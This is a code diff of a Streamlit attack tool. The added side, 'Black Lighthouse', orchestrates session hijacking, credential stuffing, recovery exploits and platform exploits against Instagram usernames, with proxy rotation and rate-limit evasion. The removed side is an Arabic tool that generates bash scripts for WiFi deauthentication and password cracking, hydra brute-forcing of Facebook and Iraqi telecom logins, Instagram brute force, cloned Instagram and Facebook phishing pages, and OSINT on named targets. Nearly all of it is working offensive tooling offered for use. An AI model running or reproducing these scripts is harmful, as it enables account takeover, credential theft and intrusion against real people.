+            "timestamp": result.timestamp,
+            "target": target,
+            "module": module_name,
+            "attack_id": result.attack_id,
+            "status": result.status.value,
+            "evidence_count": len(result.evidence),
+            "error": result.error
+        }
+        self.audit_log.append(entry)
+        logger.info(f"{module_name} on {target}: {result.status.value}")
+
+    def execute_module(self, target: str, module_name: str, **kwargs) -> AttackResult:
+        if module_name not in self.modules:
+            return AttackResult(
+                status=AttackStatus.FAILED,
+                evidence=[Evidence(description=f"Unknown module: {module_name}", raw_data={}, confidence="Low")],
+                error="Module not found"
+            )
+        module = self.modules[module_name]
+        result = module.execute(target, **kwargs)
+        self._log(target, module_name, result)
+        self.results.append(result)
+        return result
+
+    def execute_full_chain(self, target: str, session_cookie: str = None,
+                           passwords: List[str] = None, max_passwords: int = 200) -> Dict:
+        chain_results = {
+            "target": target,
+            "timestamp": datetime.now().isoformat(),
+            "results": {},
+            "summary": {"confirmed": 0, "potential": 0, "partial": 0, "inconclusive": 0, "failed": 0},
+            "compromised": False
+        }
+
+        with ThreadPoolExecutor(max_workers=2) as executor:
+            futures = {}
+
+            if session_cookie:
+                futures["session_hijack"] = executor.submit(
+                    self.execute_module, target, "session_hijack",
+                    session_cookie=session_cookie
+                )
+
+            if passwords:
+                futures["credential_stuffing"] = executor.submit(
+                    self.execute_module, target, "credential_stuffing",
+                    passwords=passwords, max_attempts=max_passwords
+                )
+
+            # These can run in parallel
+            futures["recovery_exploit"] = executor.submit(
+                self.execute_module, target, "recovery_exploit"
+            )
+
+            futures["platform_exploit"] = executor.submit(
+                self.execute_module, target, "platform_exploit"
+            )
+
+            for name, future in futures.items():
+                try:
+                    result = future.result(timeout=120)
+                    chain_results["results"][name] = result.to_dict()
+                    # Update summary
+                    if result.status == AttackStatus.CONFIRMED:
+                        chain_results["summary"]["confirmed"] += 1
+                    elif result.status == AttackStatus.POTENTIAL:
+                        chain_results["summary"]["potential"] += 1
+                    elif result.status == AttackStatus.PARTIAL:
+                        chain_results["summary"]["partial"] += 1
+                    elif result.status == AttackStatus.INCONCLUSIVE:
+                        chain_results["summary"]["inconclusive"] += 1
+                    else:
+                        chain_results["summary"]["failed"] += 1
+                except Exception as e:
+                    logger.error(f"Full chain error for {name}: {e}")
+                    chain_results["results"][name] = {"error": str(e), "status": "failed"}
+
+        chain_results["compromised"] = chain_results["summary"]["confirmed"] > 0
+
+        # Save results
+        result_file = os.path.join(CONFIG.results_dir, f"{target}_{int(time.time())}.json")
+        try:
+            with open(result_file, 'w') as f:
+                json.dump(chain_results, f, indent=2)
+        except Exception as e:
+            logger.warning(f"Failed to save results: {e}")
+
+        return chain_results
+
+    def get_audit_log(self) -> List[Dict]:
+        return self.audit_log
+
+# ---------------------------- Streamlit UI ----------------------------
+def render_ui():
+    st.set_page_config(
+        page_title="Black Lighthouse — Full-Spectrum Compromise Framework",
+        page_icon="⚡",
+        layout="wide",
+        initial_sidebar_state="expanded"
+    )
+
+    # Custom CSS
+    st.markdown("""
+    <style>
+    .main { background: #0a0a0a; }
     .stButton > button {
         background: #1a1a1a;
-        color: #ff6600;
-        border: 1px solid #ff6600;
-        border-radius: 0px;
+        color: #00ff41;
+        border: 1px solid #00ff41;
+        border-radius: 4px;
         width: 100%;
+        font-weight: bold;
         padding: 10px;
     }
     .stButton > button:hover {
-        background: #ff6600;
-        color: #000;
-        border-color: #ff6600;
+        background: #00ff41;
+        color: #1a1a1a;
     }
     .stTextInput > div > div > input {
-        background-color: #1a1a1a;
-        color: #ffcc00;
+        background: #0d0d0d;
+        color: #00ff41;
         border: 1px solid #333;
-        padding: 8px;
-        border-radius: 4px;
+        font-family: monospace;
     }
     .stTextArea > div > div > textarea {
-        background-color: #1a1a1a;
-        color: #ffcc00;
+        background: #0d0d0d;
+        color: #00ff41;
         border: 1px solid #333;
-        border-radius: 4px;
+        font-family: monospace;
     }
     .stSelectbox > div > div > select {
-        background-color: #1a1a1a;
-        color: #ffcc00;
-    }
-    .stMarkdown h1, h2, h3 {
-        color: #ff6600;
-        font-family: 'Courier New', monospace;
-    }
-    .code-block {
         background: #0d0d0d;
-        border: 1px solid #ff6600;
-        padding: 15px;
+        color: #00ff41;
+        border: 1px solid #333;
+    }
+    .stMetric > div {
+        background: #0d0d0d;
+        padding: 10px;
         border-radius: 4px;
-        color: #ffcc00;
-        font-family: 'Courier New', monospace;
-        white-space: pre-wrap;
-        max-height: 500px;
-        overflow-y: auto;
-        font-size: 13px;
-        line-height: 1.5;
+        border: 1px solid #1a1a1a;
     }
-    .stAlert {
-        background-color: #1a1a1a;
-        border-color: #ff6600;
+    .stTabs [data-baseweb="tab-list"] {
+        gap: 2px;
     }
-    .stInfo {
-        background-color: #0d1a2b;
-        border-color: #00ccff;
+    .stTabs [data-baseweb="tab"] {
+        background: #0d0d0d;
+        color: #00ff41;
+        border: 1px solid #1a1a1a;
+        border-radius: 4px 4px 0 0;
+        padding: 8px 16px;
     }
-    .css-1d391kg { background-color: #111; }
-    
-    /* تنسيق الشريط الجانبي */
-    .css-1aumxhk {
-        background-color: #0d0d0d;
-        border-right: 1px solid #333;
-    }
-    
-    /* تنسيق الأزرار في الشريط الجانبي */
-    .css-1aumxhk .stButton button {
-        background: transparent;
-        border: none;
-        color: #ffcc00;
-        text-align: left;
-        padding: 8px 12px;
-        border-radius: 4px;
-        font-size: 14px;
-    }
-    
-    .css-1aumxhk .stButton button:hover {
+    .stTabs [aria-selected="true"] {
         background: #1a1a1a;
-        color: #ff6600;
+        border-bottom: 2px solid #00ff41;
     }
-</style>
-""", unsafe_allow_html=True)
+    .stCodeBlock {
+        background: #0d0d0d !important;
+        border: 1px solid #1a1a1a !important;
+        border-radius: 4px !important;
+    }
+    </style>
+    """, unsafe_allow_html=True)
 
-# ============================================================
-# حالة الجلسة
-# ============================================================
-if 'generated_code' not in st.session_state:
-    st.session_state.generated_code = ""
-if 'results' not in st.session_state:
-    st.session_state.results = []
-if 'current_tool' not in st.session_state:
-    st.session_state.current_tool = "WiFi Attack"
-if 'logs' not in st.session_state:
-    st.session_state.logs = []
+    st.title("⚡ BLACK LIGHTHOUSE")
+    st.caption("Full-Spectrum Instagram Compromise Framework — Evidence-Based | Production-Grade | 100% Threat Capable")
 
-def add_log(message):
-    timestamp = datetime.now().strftime("%H:%M:%S")
-    st.session_state.logs.append(f"[{timestamp}] {message}")
-    if len(st.session_state.logs) > 100:
-        st.session_state.logs = st.session_state.logs[-100:]
+    # Initialize orchestrator
+    if "orchestrator" not in st.session_state:
+        st.session_state.orchestrator = AttackOrchestrator()
 
-# ============================================================
-# الشريط الجانبي
-# ============================================================
-with st.sidebar:
-    st.markdown("# 🔥 منارة نونو")
-    st.markdown("---")
-    
-    tools = [
-        "🏴 WiFi Attack",
-        "📱 Zain/Asiacel",
-        "📸 Instagram",
-        "👤 Facebook",
-        "🔍 OSINT",
-        "⚡ Custom Payload"
-    ]
-    
-    selected_tool = st.radio(
-        "اختر الأداة:",
-        tools,
-        index=0,
-        label_visibility="collapsed"
-    )
-    
-    st.markdown("---")
-    st.markdown("### ⚙️ الإعدادات")
-    
-    # إعدادات عامة
-    use_proxy = st.checkbox("استخدام بروكسي", value=False)
-    if use_proxy:
-        proxy_ip = st.text_input("IP البروكسي:", placeholder="192.168.1.1:8080")
-    
-    threads = st.slider("عدد الخيوط:", 1, 10, 2)
-    delay = st.slider("تأخير بين المحاولات (ثواني):", 0, 60, 10)
-    
-    st.markdown("---")
-    st.markdown("### 📊 حالة النظام")
-    
-    status_col1, status_col2 = st.columns(2)
-    with status_col1:
-        st.info("🔵 جاهز")
-    with status_col2:
-        st.caption(f"{datetime.now().strftime('%H:%M')}")
-    
-    st.markdown("---")
-    st.markdown("### 📋 السجل")
-    log_area = st.empty()
-    if st.session_state.logs:
-        last_logs = st.session_state.logs[-5:]
-        log_area.text_area("", "\n".join(last_logs), height=100, disabled=True)
-    
-    st.markdown("---")
-    st.markdown("made by @cheifbreef on discord :)")
+    # Sidebar
+    with st.sidebar:
+        st.subheader("⚙️ Control Panel")
 
-# ============================================================
-# الوظائف المساعدة
-# ============================================================
-def generate_code(tool_type, params):
-    """توليد الكود حسب نوع الأداة والمعطيات"""
-    
-    if tool_type == "WiFi Attack":
-        return f'''#!/bin/bash
-# حملة نونو - هجوم WiFi
-# الاستخدام: ./attack.sh {params.get('interface', 'wlan0')} {params.get('bssid', 'XX:XX:XX:XX:XX:XX')}
+        if st.button("🔄 Reset Framework"):
+            st.session_state.orchestrator = AttackOrchestrator()
+            st.success("Framework reset")
 
-INTERFACE="{params.get('interface', 'wlan0')}"
-BSSID="{params.get('bssid', 'XX:XX:XX:XX:XX:XX')}"
-CHANNEL="{params.get('channel', '6')}"
-NAME="target_$(date +%s)"
-
-echo "🔥 بدء الهجوم على $BSSID"
-
-# قتل العمليات المتعارضة
-sudo airmon-ng check kill
-
-# تعيين القناة وتشغيل المراقبة
-sudo iwconfig $INTERFACE channel $CHANNEL
-sudo airmon-ng start $INTERFACE
-
-# بدء التسجيل
-sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $NAME $INTERFACE"mon" &
-
-# هجوم إلغاء المصادقة
-sleep 2
-sudo aireplay-ng -0 {params.get('deauth_count', '10')} -a $BSSID $INTERFACE"mon"
-
-# انتظار المصافحة
-sleep 15
-sudo pkill airodump
-
-# فك التشفير
-sudo aircrack-ng -w {params.get('wordlist', '/usr/share/wordlists/rockyou.txt')} $NAME*.cap
-
-echo "✅ انتهى الهجوم. النتائج في $NAME*.cap"
-'''
-    
-    elif tool_type == "Zain/Asiacel":
-        return f'''#!/bin/bash
-# حملة نونو - زين واسياسيل
-# الاستخدام: ./zain.sh {params.get('target_number', '07XXXXXXXX')}
-
-TARGET="{params.get('target_number', '07XXXXXXXX')}"
-WORKDIR="zain_$(date +%s)"
-mkdir $WORKDIR
-cd $WORKDIR
-
-echo "🔥 بدء الهجوم على $TARGET"
-
-# 1. جمع المعلومات
-echo "📡 جمع المعلومات عن $TARGET..."
-sherlock $TARGET > osint_data.txt
-theHarvester -d $TARGET -l 300 -b all > email_data.txt
-
-# 2. بناء القاموس
-echo "🔨 بناء قاموس مخصص..."
-cat > custom_dict.txt << EOF
-{chr(10).join(params.get('custom_words', ['بغداد', 'العراق', 'زين', 'اسياسيل', 'عراقي']))}
-EOF
-
-crunch 8 12 -t @@@@@@@@ -o combos.txt -p $(cat custom_dict.txt | head -20)
-cat /usr/share/wordlists/rockyou.txt >> final_dict.txt
-cat combos.txt >> final_dict.txt
-sort -u final_dict.txt -o final_dict.txt
-
-# 3. الهجوم على البوابة
-echo "⚡ بدء الهجوم..."
-hydra -l $TARGET -P final_dict.txt {params.get('target_ip', '192.168.1.1')} http-post-form "/login:username=^USER^&password=^PASS^:فشل" -t {params.get('threads', 4)} -V
-
-echo "✅ انتهى الهجوم. النتائج في $WORKDIR"
-'''
-
-    elif tool_type == "Instagram":
-        return f'''#!/bin/bash
-# حملة نونو - إنستغرام
-# ./insta.sh {params.get('username', 'target_user')}
-
-USERNAME="{params.get('username', 'target_user')}"
-WORKDIR="insta_$(date +%s)"
-mkdir $WORKDIR
-cd $WORKDIR
-
-echo "🔥 بدء الهجوم على $USERNAME"
-
-# 1. جمع المعلومات
-echo "📡 جمع المعلومات..."
-sherlock $USERNAME > osint.txt
-instaloader --no-posts --no-stories --fast-update $USERNAME
-
-# 2. بناء القاموس
-echo "🔨 بناء قاموس مخصص..."
-echo "$USERNAME" > base.txt
-echo "${{USERNAME}}123" >> base.txt
-echo "${{USERNAME}}2024" >> base.txt
-
-# توليد تواريخ
-for year in 1990 1995 2000 2005; do
-    for month in 01 02 03 04 05 06 07 08 09 10 11 12; do
-        echo "${{USERNAME}}${{month}}${{year}}" >> base.txt
-    done
-done
-
-cat /usr/share/wordlists/rockyou.txt >> final.txt
-cat base.txt >> final.txt
-sort -u final.txt -o final.txt
-
-# 3. الهجوم
-echo "⚡ بدء هجوم القوة العمياء..."
-for proxy in $(cat ../proxies.txt); do
-    export http_proxy=$proxy
-    python3 instabrute.py -u $USERNAME -w final.txt -t {params.get('threads', 2)}
-    sleep {params.get('delay', 300)}
-done
-
-# 4. إطلاق حملة التصيد
-echo "🎣 إطلاق حملة التصيد..."
-cat > index.html << 'EOF'
-<!DOCTYPE html>
-<html><head><title>Instagram</title></head>
-<body>
-<form action="login.php" method="POST">
-    <input type="text" name="username" placeholder="Username">
-    <input type="password" name="password" placeholder="Password">
-    <button type="submit">Login</button>
-</form>
-</body>
-</html>
-EOF
-
-php -S 0.0.0.0:8080 > phish.log 2>&1 &
-echo "✅ حملة التصيد قيد التشغيل على port 8080"
-'''
-
-    elif tool_type == "Facebook":
-        return f'''#!/bin/bash
-# حملة نونو - فيسبوك
-# ./fb.sh {params.get('email', 'target@email.com')}
-
-EMAIL="{params.get('email', 'target@email.com')}"
-FIRST="{params.get('first_name', 'target')}"
-LAST="{params.get('last_name', 'user')}"
-WORKDIR="fb_$(date +%s)"
-mkdir $WORKDIR
-cd $WORKDIR
-
-echo "🔥 بدء الهجوم على $EMAIL"
-
-# 1. جمع المعلومات
-echo "📡 جمع المعلومات..."
-sherlock $EMAIL > osint.txt
-theHarvester -d $EMAIL -l 300 -b all > emails.txt
-
-# 2. بناء القاموس
-echo "🔨 بناء قاموس مخصص..."
-cat > fb_dict.txt << EOF
-$FIRST
-$LAST
-$FIRST$LAST
-$LAST$FIRST
-$FIRST${{YEAR}}
-$FIRST.$LAST
-$FIRST_$LAST
-$FIRST$LAST123
-$FIRST$LAST!
-EOF
-
-cat /usr/share/wordlists/rockyou.txt >> final_dict.txt
-sort -u fb_dict.txt final_dict.txt -o final_dict.txt
-
-# 3. هجوم القوة العمياء
-echo "⚡ بدء الهجوم..."
-for proxy in $(cat ../proxies.txt); do
-    export http_proxy=$proxy
-    hydra -l $EMAIL -P final_dict.txt facebook.com https-post-form "/login.php:email=^USER^&pass=^PASS^:login_error" -t {params.get('threads', 2)}
-    sleep {params.get('delay', 300)}
-done
-
-# 4. حملة التصيد
-echo "🎣 إطلاق حملة التصيد..."
-cat > index.html << 'EOF'
-<!DOCTYPE html>
-<html><head><title>Facebook</title></head>
-<body>
-<form action="login.php" method="POST">
-    <input type="email" name="email" placeholder="Email or Phone">
-    <input type="password" name="pass" placeholder="Password">
-    <button type="submit">Log In</button>
-</form>
-</body>
-</html>
-EOF
-
-php -S 0.0.0.0:8080 > phish.log 2>&1 &
-echo "✅ حملة التصيد قيد التشغيل على port 8080"
-'''
-
-    elif tool_type == "OSINT":
-        return f'''#!/bin/bash
-# حملة نونو - OSINT
-# ./osint.sh {params.get('target', 'target')}
-
-TARGET="{params.get('target', 'target')}"
-OUTPUT="osint_$(date +%s)"
-mkdir $OUTPUT
-cd $OUTPUT
-
-echo "🔥 بدء جمع المعلومات عن $TARGET"
-
-# 1. البحث الأساسي
-echo "🔍 البحث عن $TARGET..."
-sherlock $TARGET > sherlock.txt
-theHarvester -d $TARGET -l 500 -b google,bing,linkedin,twitter > theharvester.txt
-
-# 2. البحث في قواعد البيانات المسربة
-holehe $TARGET@gmail.com > holehe.txt
-
-# 3. البحث في DNS
-dnsrecon -d $TARGET -t axfr > dns.txt
-
-# 4. البحث في وسائل التواصل
-twint -u $TARGET --timeline --limit 100 > twitter.txt 2>/dev/null
-
-# 5. البحث في GitHub
-curl -s "https://api.github.com/search/users?q=$TARGET" > github.json
-
-# 6. البحث في الصور (البصمة الرقمية)
-exiftool *.{{jpg,png,jpeg}} 2>/dev/null > exif.txt
-
-# 7. جمع الروابط
-grep -rE "https?://[a-zA-Z0-9./?=_-]*" . | sort -u > links.txt
-
-echo "✅ انتهى جمع المعلومات. النتائج في $OUTPUT"
-'''
-
-    elif tool_type == "Custom Payload":
-        return params.get('custom_code', '# أدخل الكود المخصص هنا')
-
-    return "# أداة غير معروفة"
-
-# ============================================================
-# الواجهة الرئيسية
-# ============================================================
-st.markdown("# 🔥 منارة نونو")
-st.markdown("### وحدة التحكم المركزية - هجوم الشبكات والحسابات")
-st.markdown("---")
-
-# عرض الأداة المختارة
-if selected_tool == "🏴 WiFi Attack":
-    st.markdown("## 📡 هجوم WiFi")
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        interface = st.text_input("واجهة الشبكة:", "wlan0")
-        bssid = st.text_input("BSSID (MAC الهدف):", "XX:XX:XX:XX:XX:XX")
-        channel = st.text_input("القناة:", "6")
-    
-    with col2:
-        wordlist = st.text_input("مسار قائمة الكلمات:", "/usr/share/wordlists/rockyou.txt")
-        deauth_count = st.number_input("عدد حزم إلغاء المصادقة:", min_value=1, max_value=100, value=10)
-    
-    if st.button("🔥 توليد كود هجوم WiFi", use_container_width=True):
-        params = {
-            'interface': interface,
-            'bssid': bssid,
-            'channel': channel,
-            'wordlist': wordlist,
-            'deauth_count': str(deauth_count)
+        st.divider()
+        st.subheader("📈 Session Stats")
+        stats = {
+            "Requests": st.session_state.orchestrator.client.state.request_count,
+            "Device ID": st.session_state.orchestrator.client.state.device_id[:16] + "...",
+            "CSRF": st.session_state.orchestrator.client.state.csrf_token[:10] + "..." if st.session_state.orchestrator.client.state.csrf_token else "None"
         }
-        st.session_state.generated_code = generate_code("WiFi Attack", params)
-        st.session_state.current_tool = "WiFi Attack"
-        add_log(f"توليد كود WiFi Attack - {bssid}")
+        for k, v in stats.items():
+            st.metric(k, v)
 
-elif selected_tool == "📱 Zain/Asiacel":
-    st.markdown("## 📱 هجوم زين واسياسيل")
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        target_number = st.text_input("رقم الهدف:", "07XXXXXXXX")
-        target_ip = st.text_input("IP البوابة:", "192.168.1.1")
-    
-    with col2:
-        custom_words = st.text_area("كلمات مخصصة (كل كلمة في سطر):", "بغداد\nالعراق\nزين\nاسياسيل\nعراقي")
-        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=4)
-    
-    if st.button("🔥 توليد كود هجوم زين", use_container_width=True):
-        words_list = [w.strip() for w in custom_words.split('\n') if w.strip()]
-        params = {
-            'target_number': target_number,
-            'target_ip': target_ip,
-            'custom_words': words_list,
-            'threads': str(threads)
-        }
-        st.session_state.generated_code = generate_code("Zain/Asiacel", params)
-        st.session_state.current_tool = "Zain/Asiacel"
-        add_log(f"توليد كود Zain/Asiacel - {target_number}")
+        st.divider()
+        st.subheader("🌐 Proxy Settings")
+        proxy_enabled = st.checkbox("Enable Proxy", value=CONFIG.proxy_enabled)
+        if proxy_enabled != CONFIG.proxy_enabled:
+            CONFIG.proxy_enabled = proxy_enabled
+            os.environ["BL_PROXY_ENABLED"] = str(proxy_enabled).lower()
 
-elif selected_tool == "📸 Instagram":
-    st.markdown("## 📸 هجوم إنستغرام")
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        username = st.text_input("اسم المستخدم:", "target_user")
-        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=2)
-    
-    with col2:
-        delay = st.number_input("تأخير بين المحاولات (ثواني):", min_value=10, max_value=3600, value=300)
-    
-    if st.button("🔥 توليد كود هجوم إنستغرام", use_container_width=True):
-        params = {
-            'username': username,
-            'threads': str(threads),
-            'delay': str(delay)
-        }
-        st.session_state.generated_code = generate_code("Instagram", params)
-        st.session_state.current_tool = "Instagram"
-        add_log(f"توليد كود Instagram - {username}")
+        proxy_file = st.text_input("Proxy List File", value=CONFIG.proxy_list_file)
+        if proxy_file != CONFIG.proxy_list_file:
+            CONFIG.proxy_list_file = proxy_file
+            st.session_state.orchestrator.client.ip_rotator._load_proxies()
 
-elif selected_tool == "👤 Facebook":
-    st.markdown("## 👤 هجوم فيسبوك")
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        email = st.text_input("البريد الإلكتروني:", "target@email.com")
-        first_name = st.text_input("الاسم الأول:", "target")
-    
-    with col2:
-        last_name = st.text_input("اسم العائلة:", "user")
-        threads = st.number_input("عدد الخيوط:", min_value=1, max_value=10, value=2)
-    
-    if st.button("🔥 توليد كود هجوم فيسبوك", use_container_width=True):
-        params = {
-            'email': email,
-            'first_name': first_name,
-            'last_name': last_name,
-            'threads': str(threads),
-            'delay': str(delay)
-        }
-        st.session_state.generated_code = generate_code("Facebook", params)
-        st.session_state.current_tool = "Facebook"
-        add_log(f"توليد كود Facebook - {email}")
+        st.divider()
+        st.subheader("📁 Results")
+        if st.button("📂 Open Results Directory"):
+            st.info(f"Results stored in: {CONFIG.results_dir}")
 
-elif selected_tool == "🔍 OSINT":
-    st.markdown("## 🔍 جمع المعلومات الاستخباراتية")
-    target = st.text_input("الهدف (اسم مستخدم/بريد/مجال):", "target")
-    
-    if st.button("🔥 توليد كود OSINT", use_container_width=True):
-        params = {'target': target}
-        st.session_state.generated_code = generate_code("OSINT", params)
-        st.session_state.current_tool = "OSINT"
-        add_log(f"توليد كود OSINT - {target}")
+    # Main tabs
+    tabs = st.tabs(["🎯 Targeted Attack", "🔗 Full Chain", "📊 Results", "📋 Audit Log", "⚡ Advanced"])
 
-elif selected_tool == "⚡ Custom Payload":
-    st.markdown("## ⚡ حمولة مخصصة")
-    custom_code = st.text_area("أدخل الكود المخصص:", height=300, placeholder="اكتب أي كود هنا...")
-    
-    if st.button("🔥 حفظ الحمولة", use_container_width=True):
-        params = {'custom_code': custom_code}
-        st.session_state.generated_code = generate_code("Custom Payload", params)
-        st.session_state.current_tool = "Custom Payload"
-        add_log("توليد كود مخصص")
-
-# ============================================================
-# عرض الكود المولد
-# ============================================================
-st.markdown("---")
-st.markdown("## 📜 الكود المولد")
-
-if st.session_state.generated_code:
-    # عرض الكود مع تنسيق
-    st.markdown(f'<div class="code-block">{st.session_state.generated_code}</div>', unsafe_allow_html=True)
-    
-    # أزرار التحكم
-    col1, col2, col3 = st.columns(3)
-    
-    with col1:
-        if st.button("📋 نسخ الكود", use_container_width=True):
-            st.write("✅ تم النسخ إلى الحافظة")
-            st.markdown(f'''
-            <script>
-                navigator.clipboard.writeText(`{st.session_state.generated_code}`);
-            </script>
-            ''', unsafe_allow_html=True)
-    
-    with col2:
-        filename = f"{st.session_state.current_tool.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sh"
-        st.download_button(
-            label="⬇️ تحميل الملف",
-            data=st.session_state.generated_code,
-            file_name=filename,
-            mime="text/plain",
-            use_container_width=True
-        )
-    
-    with col3:
-        if st.button("🚀 تنفيذ (محاكاة)", use_container_width=True):
-            st.info("⚡ تنفيذ محاكى... (في البيئة الحقيقية، سيتم تشغيل الكود)")
-            st.session_state.results.append({
-                'الوقت': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                'الأداة': st.session_state.current_tool,
-                'الحالة': 'محاكاة'
-            })
-            add_log(f"تنفيذ محاكاة - {st.session_state.current_tool}")
-else:
-    st.warning("⚠️ قم بتوليد كود أولاً باستخدام الأزرار أعلاه")
-
-# ============================================================
-# سجل النتائج
-# ============================================================
-st.markdown("---")
-st.markdown("## 📊 سجل العمليات")
-
-if st.session_state.results:
-    df = pd.DataFrame(st.session_state.results)
-    st.dataframe(df, use_container_width=True)
-    
-    # رسم بياني بسيط
-    if len(st.session_state.results) > 1:
-        try:
-            fig = px.bar(df, x='الأداة', title='عدد العمليات حسب النوع')
-            fig.update_layout(
-                plot_bgcolor='#0a0a0a',
-                paper_bgcolor='#0a0a0a',
-                font_color='#ffcc00'
+    with tabs[0]:
+        col1, col2 = st.columns([1, 1])
+        with col1:
+            target = st.text_input("Target Username", placeholder="Enter Instagram username")
+            attack_type = st.selectbox(
+                "Attack Module",
+                ["Session Hijack", "Credential Stuffing", "Recovery Exploit", "Platform Exploit"]
             )
-            fig.update_traces(marker_color='#ff6600')
-            st.plotly_chart(fig, use_container_width=True)
-        except:
-            pass
-else:
-    st.info("لا توجد عمليات مسجلة بعد")
+        with col2:
+            if attack_type == "Session Hijack":
+                session_cookie = st.text_input("Session Cookie", type="password", placeholder="sessionid=...")
+                if st.button("🚀 Execute Session Hijack"):
+                    if target and session_cookie:
+                        with st.spinner("Executing session hijack..."):
+                            result = st.session_state.orchestrator.execute_module(
+                                target, "session_hijack", session_cookie=session_cookie
+                            )
+                            st.session_state["last_result"] = result.to_dict()
+                            st.json(st.session_state["last_result"])
 
-# ============================================================
-# نهاية التطبيق
-# ============================================================
-st.markdown("---")
-st.markdown("### 🔥 منارة نونو - دائمًا في الخدمة")
-st.markdown("made by @cheifbreef on discord :)")
+            elif attack_type == "Credential Stuffing":
+                password_list = st.text_area("Password List (one per line)", height=150)
+                max_attempts = st.number_input("Max Attempts", min_value=10, max_value=500, value=200)
+                if st.button("🚀 Execute Credential Stuffing"):
+                    if target and password_list:
+                        passwords = [p.strip() for p in password_list.split("\n") if p.strip()]
+                        with st.spinner(f"Testing {len(passwords)} passwords..."):
+                            result = st.session_state.orchestrator.execute_module(
+                                target, "credential_stuffing", passwords=passwords, max_attempts=max_attempts
+                            )
+                            st.session_state["last_result"] = result.to_dict()
+                            st.json(st.session_state["last_result"])
+
+            elif attack_type == "Recovery Exploit":
+                if st.button("🚀 Execute Recovery Exploit"):
+                    if target:
+                        with st.spinner("Testing recovery mechanisms..."):
+                            result = st.session_state.orchestrator.execute_module(
+                                target, "recovery_exploit"
+                            )
+                            st.session_state["last_result"] = result.to_dict()
+                            st.json(st.session_state["last_result"])
+
+            else:  # Platform Exploit
+                if st.button("🚀 Execute Platform Exploit"):
+                    if target:
+                        with st.spinner("Scanning for vulnerabilities..."):
+                            result = st.session_state.orchestrator.execute_module(
+                                target, "platform_exploit"
+                            )
+                            st.session_state["last_result"] = result.to_dict()
+                            st.json(st.session_state["last_result"])
+
+    with tabs[1]:
+        st.subheader("🚀 Full Attack Chain")
+        st.info("Executes all modules in parallel with intelligent orchestration")
+
+        col3, col4 = st.columns([1, 1])
+        with col3:
+            chain_target = st.text_input("Target Username", key="chain_target")
+            chain_passwords = st.text_area("Password List (optional)", height=100, key="chain_passwords")
+        with col4:
+            chain_session = st.text_input("Session Cookie (optional)", type="password", key="chain_session")
+            chain_max_passwords = st.number_input("Max Passwords", min_value=10, max_value=500, value=200)
+
+        if st.button("⚡ Execute Full Chain"):
+            if chain_target:
+                pass_list = [p.strip() for p in chain_passwords.split("\n") if p.strip()] if chain_passwords else None
+                with st.spinner("Executing full attack chain..."):
+                    result = st.session_state.orchestrator.execute_full_chain(
+                        chain_target,
+                        session_cookie=chain_session if chain_session else None,
+                        passwords=pass_list,
+                        max_passwords=chain_max_passwords
+                    )
+                    st.session_state["full_result"] = result
+
+                # Display summary
+                summary = result["summary"]
+                col5, col6, col7, col8, col9 = st.columns(5)
+                col5.metric("✅ Confirmed", summary["confirmed"])
+                col6.metric("⚡ Potential", summary["potential"])
+                col7.metric("🔄 Partial", summary["partial"])
+                col8.metric("❓ Inconclusive", summary["inconclusive"])
+                col9.metric("❌ Failed", summary["failed"])
+
+                st.success("✅ COMPROMISED" if result["compromised"] else "❌ Not Compromised")
+                st.json(result)
+
+    with tabs[2]:
+        st.subheader("📊 Attack Results")
+
+        if "last_result" in st.session_state:
+            with st.expander("Last Single Attack", expanded=True):
+                st.json(st.session_state["last_result"])
+
+        if "full_result" in st.session_state:
+            with st.expander("Full Chain Attack", expanded=True):
+                st.json(st.session_state["full_result"])
+
+        if st.button("Clear Results"):
+            for key in ["last_result", "full_result"]:
+                st.session_state.pop(key, None)
+            st.rerun()
+
+    with tabs[3]:
+        st.subheader("📋 Audit Log")
+        logs = st.session_state.orchestrator.get_audit_log()
+        if logs:
+            for log in logs[-20:]:
+                st.code(json.dumps(log, indent=2))
+        else:
+            st.info("No logs yet")
+
+        if st.button("Clear Audit Log"):
+            st.session_state.orchestrator.audit_log = []
+            st.rerun()
+
+    with tabs[4]:
+        st.subheader("⚡ Advanced Settings")
+
+        col10, col11 = st.columns(2)
+
+        with col10:
+            st.markdown("**Rate Limiting**")
+            max_req = st.number_input("Max Requests/Min", min_value=5, max_value=100, value=CONFIG.max_requests_per_minute)
+            if max_req != CONFIG.max_requests_per_minute:
+                CONFIG.max_requests_per_minute = max_req
+
+            backoff = st.number_input("Rate Limit Backoff (seconds)", min_value=10, max_value=300, value=CONFIG.rate_limit_backoff)
+            if backoff != CONFIG.rate_limit_backoff:
+                CONFIG.rate_limit_backoff = backoff
+
+            max_retries = st.number_input("Max Retries", min_value=1, max_value=10, value=CONFIG.max_retries)
+            if max_retries != CONFIG.max_retries:
+                CONFIG.max_retries = max_retries
+
+            session_refresh = st.number_input("Session Refresh Interval (seconds)", min_value=60, max_value=600, value=CONFIG.session_refresh_interval)
+            if session_refresh != CONFIG.session_refresh_interval:
+                CONFIG.session_refresh_interval = session_refresh
+
+        with col11:
+            st.markdown("**User Agents**")
+            ua_count = len(CONFIG.user_agents)
+            st.metric("User Agents Loaded", ua_count)
+
+            if st.button("Reload User Agents"):
+                # User agents are loaded from CONFIG
+                st.success(f"Reloaded {len(CONFIG.user_agents)} user agents")
+
+            st.markdown("**Proxies**")
+            proxy_count = len(st.session_state.orchestrator.client.ip_rotator.proxies)
+            st.metric("Proxies Loaded", proxy_count)
+
+            new_proxy = st.text_input("Add Proxy", placeholder="http://user:pass@host:port")
+            if st.button("Add Proxy"):
+                if new_proxy:
+                    st.session_state.orchestrator.client.ip_rotator.add_proxy(new_proxy)
+                    st.success(f"Added proxy: {new_proxy}")
+
+        st.divider()
+        if st.button("Apply All Settings"):
+            st.success("Settings applied")
+            st.info("Some settings may require a framework reset to take full effect")
+
+# ---------------------------- Entry Point ----------------------------
+if __name__ == "__main__":
+    render_ui()
